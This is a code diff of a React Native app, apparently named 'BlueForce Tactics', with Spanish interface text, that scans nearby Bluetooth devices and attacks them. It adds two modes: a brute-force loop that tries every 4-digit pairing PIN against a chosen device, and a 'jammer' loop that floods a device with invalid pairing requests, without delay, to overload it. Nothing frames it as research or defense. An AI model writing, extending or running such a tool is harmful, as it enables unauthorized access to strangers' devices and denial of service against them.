@@ -5,7 +5,8 @@ import RNBluetoothClassic from 'react-native-bluetooth-classic';
 export default function App() {
   const [discoveredDevices, setDiscoveredDevices] = useState([]);
   const [selectedDevice, setSelectedDevice] = useState(null);
-  const [isBruting, setIsBruting] = useState(false);
+  const [isBusy, setIsBusy] = useState(false);
+  const [mode, setMode] = useState('IDLE'); // IDLE, BRUTE, JAMMER
   const [currentPin, setCurrentPin] = useState('0000');
   const [logs, setLogs] = useState([]);
 
@@ -15,126 +16,143 @@ export default function App() {
 
   const requestPermissions = async () => {
     if (Platform.OS === 'android') {
-      const granted = await PermissionsAndroid.requestMultiple([
+      await PermissionsAndroid.requestMultiple([
         PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
         PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
         PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
       ]);
-      addLog("✅ Capa de permisos lista.");
+      addLog("✅ Sistemas tácticos cargados.");
     }
   };
 
-  useEffect(() => {
-    requestPermissions();
-  }, []);
+  useEffect(() => { requestPermissions(); }, []);
 
-  const scanDevices = async () => {
+  const scan = async () => {
     setDiscoveredDevices([]);
-    addLog("🔍 Analizando el espectro Bluetooth...");
+    addLog("🔍 Escaneando entorno...");
     try {
       const devices = await RNBluetoothClassic.startDiscovery();
       setDiscoveredDevices(devices);
-      addLog(`✅ Se detectaron ${devices.length} objetivos.`);
-    } catch (err) {
-      addLog(`⚠️ ERROR: ${err.message}`);
-    }
+      addLog(`✅ Detectados ${devices.length} objetivos.`);
+    } catch (err) { addLog(`⚠️ ERROR: ${err.message}`); }
   };
 
-  const startAttack = async (device) => {
+  // MODO 1: FUERZA BRUTA (Para entrar)
+  const startBruteForce = async (device) => {
     setSelectedDevice(device);
-    setIsBruting(true);
-    addLog(`🚀 ATAQUE INICIADO contra ${device.name || 'ANÓNIMO'} (${device.address})`);
+    setMode('BRUTE');
+    setIsBusy(true);
+    addLog(`🚀 FUERZA BRUTA contra ${device.address}`);
 
     for (let i = 0; i <= 9999; i++) {
-      if (!isBruting) break;
+      if (mode === 'IDLE') break;
       const pin = i.toString().padStart(4, '0');
       setCurrentPin(pin);
-      
       try {
-        const connected = await RNBluetoothClassic.pairDevice(device.address, { pin });
-        if (connected) {
-          addLog(`🎯 CRACKEADO! PIN: ${pin}`);
-          setIsBruting(false);
-          Alert.alert("¡DISPOSITIVO CONQUISTADO!", `PIN: ${pin}`);
+        const ok = await RNBluetoothClassic.pairDevice(device.address, { pin });
+        if (ok) {
+          addLog(`🎯 PIN ENCONTRADO: ${pin}`);
+          setMode('IDLE');
+          Alert.alert("¡CONQUISTADO!", `PIN: ${pin}`);
           break;
         }
-      } catch (err) {
-        if (i % 10 === 0) addLog(`... Probando rango ${i}-${i+9}`);
-        await new Promise(r => setTimeout(r, 800));
+      } catch (e) {
+        if (i % 5 === 0) addLog(`... Progresando: ${pin}`);
+        await new Promise(r => setTimeout(r, 600));
       }
     }
-    setIsBruting(false);
+    setIsBusy(false);
+    setMode('IDLE');
   };
 
-  const renderDevice = ({ item }) => (
-    <View style={styles.deviceCard}>
-      <View style={styles.deviceInfo}>
-        <Text style={styles.deviceName}>{item.name || "DISPOSITIVO ANÓNIMO"}</Text>
-        <Text style={styles.deviceMac}>{item.address}</Text>
-        <Text style={styles.deviceExtra}>Fuerza de Señal: {item.rssi || '?' } dBm</Text>
+  // MODO 2: JAMMER (Para bloquear)
+  const startJammer = async (device) => {
+    setSelectedDevice(device);
+    setMode('JAMMER');
+    setIsBusy(true);
+    addLog(`🔥 ACTIVANDO JAMMER (BLOQUEO) contra ${device.address}`);
+    
+    while (true) {
+      // Necesitamos una referencia fresca del estado mode para poder parar
+      let currentMode;
+      setMode(m => { currentMode = m; return m; });
+      if (currentMode !== 'JAMMER') break;
+
+      try {
+        // Saturación por peticiones de emparejamiento inválidas
+        await RNBluetoothClassic.pairDevice(device.address, { pin: '9999' });
+      } catch (e) {
+        addLog(`⚡ Pulso enviado...`);
+        // Sin retraso para saturar el procesador del parlante
+      }
+    }
+    setIsBusy(false);
+    addLog("⏹️ Jammer desactivado.");
+  };
+
+  const stop = () => { setMode('IDLE'); setIsBusy(false); };
+
+  const renderItem = ({ item }) => (
+    <View style={styles.card}>
+      <View style={{ flex: 1 }}>
+        <Text style={styles.name}>{item.name || "N/A"}</Text>
+        <Text style={styles.mac}>{item.address} | {item.rssi} dBm</Text>
       </View>
-      <TouchableOpacity 
-        style={styles.attackBtn} 
-        onPress={() => startAttack(item)}
-        disabled={isBruting}
-      >
-        <Text style={styles.attackBtnText}>SELECCIONAR</Text>
-      </TouchableOpacity>
+      <View style={{ flexDirection: 'row' }}>
+        <TouchableOpacity style={styles.btnSmall} onPress={() => startBruteForce(item)} disabled={isBusy}>
+          <Text style={styles.btnText}>ATACAR</Text>
+        </TouchableOpacity>
+        <TouchableOpacity style={[styles.btnSmall, { backgroundColor: '#ff0055', marginLeft: 5 }]} onPress={() => startJammer(item)} disabled={isBusy}>
+          <Text style={styles.btnText}>BLOQUEAR</Text>
+        </TouchableOpacity>
+      </View>
     </View>
   );
 
   return (
     <View style={styles.container}>
-      <Text style={styles.header}>BlueForce Analyzer</Text>
+      <Text style={styles.title}>BlueForce Tactics</Text>
       
-      <View style={styles.statsPanel}>
-        <Text style={styles.statText}>OBJETIVO: {selectedDevice ? selectedDevice.address : "NINGUNO"}</Text>
-        <Text style={styles.pinText}>PIN ACTUAL: {currentPin}</Text>
+      <View style={styles.panel}>
+        <Text style={styles.status}>MODO: {mode} | PIN: {currentPin}</Text>
+        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={isBusy}>
+          <Text style={styles.scanBtnText}>ESCANEAR ÁREA</Text>
+        </TouchableOpacity>
       </View>
-
-      <TouchableOpacity style={styles.scanBtn} onPress={scanDevices} disabled={isBruting}>
-        <Text style={styles.scanBtnText}>ESCANEAR ENTORNO</Text>
-      </TouchableOpacity>
 
       <FlatList
         data={discoveredDevices}
-        keyExtractor={(item) => item.address}
-        renderItem={renderDevice}
-        ListEmptyComponent={<Text style={styles.emptyText}>Pulsa Escanear para buscar señales...</Text>}
-        style={styles.list}
+        renderItem={renderItem}
+        keyExtractor={i => i.address}
+        style={{ flex: 1 }}
       />
 
-      <ScrollView style={styles.logBox}>
-        {logs.map((log, index) => <Text key={index} style={styles.logLine}>{log}</Text>)}
-      </ScrollView>
-
-      {isBruting && (
-        <TouchableOpacity style={styles.stopBtn} onPress={() => setIsBruting(false)}>
-          <Text style={styles.stopBtnText}>DETENER ATAQUE</Text>
+      {mode !== 'IDLE' && (
+        <TouchableOpacity style={styles.stopBtn} onPress={stop}>
+          <Text style={styles.btnText}>DETENER TODO</Text>
         </TouchableOpacity>
       )}
+
+      <ScrollView style={styles.logs} nestedScrollEnabled={true}>
+        {logs.map((l, i) => <Text key={i} style={styles.logText}>{l}</Text>)}
+      </ScrollView>
     </View>
   );
 }
 
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#05070a', padding: 20, paddingTop: 50 },
-  header: { fontSize: 28, fontWeight: '800', color: '#00f2ff', textAlign: 'center', marginBottom: 20 },
-  statsPanel: { backgroundColor: '#10141d', padding: 15, borderRadius: 15, marginBottom: 15, borderLeftWidth: 4, borderLeftColor: '#00f2ff' },
-  statText: { color: '#fff', fontSize: 12, opacity: 0.7 },
-  pinText: { color: '#00f2ff', fontSize: 24, fontWeight: 'bold' },
-  scanBtn: { backgroundColor: '#fff', padding: 15, borderRadius: 12, alignItems: 'center', marginBottom: 20 },
-  scanBtnText: { fontWeight: 'bold', fontSize: 16 },
-  list: { flex: 1, marginBottom: 20 },
-  deviceCard: { backgroundColor: '#1a1f2b', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center' },
-  deviceName: { color: '#fff', fontWeight: 'bold', fontSize: 16 },
-  deviceMac: { color: '#00f2ff', fontSize: 12, fontFamily: 'monospace' },
-  deviceExtra: { color: '#888', fontSize: 10 },
-  attackBtn: { backgroundColor: '#00f2ff', padding: 10, borderRadius: 8 },
-  attackBtnText: { fontSize: 12, fontWeight: 'bold' },
-  logBox: { height: 120, backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 10, padding: 10 },
-  logLine: { color: '#666', fontSize: 10, marginBottom: 2 },
-  emptyText: { color: '#444', textAlign: 'center', marginTop: 50 },
-  stopBtn: { backgroundColor: '#ff0055', padding: 15, borderRadius: 12, alignItems: 'center', marginTop: 10 },
-  stopBtnText: { color: '#fff', fontWeight: 'bold' }
+  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
+  title: { color: '#00f2ff', fontSize: 24, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
+  panel: { backgroundColor: '#111', padding: 15, borderRadius: 10, marginBottom: 20 },
+  status: { color: '#fff', fontSize: 14, marginBottom: 10, fontFamily: 'monospace' },
+  scanBtn: { backgroundColor: '#00f2ff', padding: 12, borderRadius: 8, alignItems: 'center' },
+  scanBtnText: { fontWeight: 'bold' },
+  card: { backgroundColor: '#181818', padding: 15, borderRadius: 10, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
+  name: { color: '#fff', fontWeight: 'bold' },
+  mac: { color: '#888', fontSize: 10 },
+  btnSmall: { backgroundColor: '#222', padding: 8, borderRadius: 5 },
+  btnText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
+  stopBtn: { backgroundColor: '#ff0055', padding: 15, borderRadius: 10, alignItems: 'center', marginBottom: 10 },
+  logs: { height: 100, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 5 },
+  logText: { color: '#555', fontSize: 9 }
 });
